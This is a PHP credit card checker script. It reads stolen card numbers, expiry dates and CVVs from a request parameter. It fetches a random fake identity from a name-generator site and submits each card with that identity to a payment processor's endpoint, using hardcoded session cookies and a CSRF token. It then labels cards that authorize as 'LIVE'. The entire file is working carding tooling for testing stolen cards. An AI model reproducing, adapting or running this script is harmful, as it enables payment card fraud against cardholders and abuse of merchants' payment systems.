<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $random = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united%20states');
    $data = json_decode($randomShits, true);

    $fName = explode(" ", $data['name'])[0];
    $lName = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $city = preg_split("/[\s,]+/", $data['street2'])[0];
    $state = preg_split("/[\s,]+/", $data['street2'])[1];
    $postcode = preg_split("/[\s,]+/", $data['street2'])[2];
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://pay.ccbill.com/paymentMethods',
        CURLOPT_HEADER => 0,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_POST => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/json;charset=UTF-8',
            'Cookie: _ga=GA1.2.511426303.1616208613; _gid=GA1.2.858154455.1616208613; SESSION=5bc157dc-dbee-43af-b7c5-b80eeba0d20d',
            'Origin: https://pay.ccbill.com',
            'Referer: https://pay.ccbill.com/',
            'X-CSRF-TOKEN: a5605d7c-8251-440e-8ffc-23018663df89',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"type":"card","countryAbbr":"US","accountType":null,"cardNumber":"'.$cc.'","expiryMonth":"'.$mm.'","expiryYear":'.$yy.',"cvv":'.$cvv.',"firstName":"'.$fName.'","lastName":"'.$lName.'","address":"'.$street.'","city":"'.$city.'","provinceAbbr":"'.$state.'","postalCode":"'.$postcode.'","phoneNumber":"'.$phone.'","accountNumber":null,"reEnterAccountNumber":null,"routingNumber":null,"threedsResponse":null}'
    ));
    $execute = curl_exec($ch);
    $response = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $respo = GetStr($execute, '"generalMessage":"The account information entered ', ' and');
    $code = GetStr($execute, ',"errorCode":"', '"');

    if ($response == 201) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorized</span></td></tr><br>';

    } elseif (strpos($execute, 'errors')) {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$code.': '.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-warning badge-pill">Error Not Listed</span></td></tr><br>';
    }
?>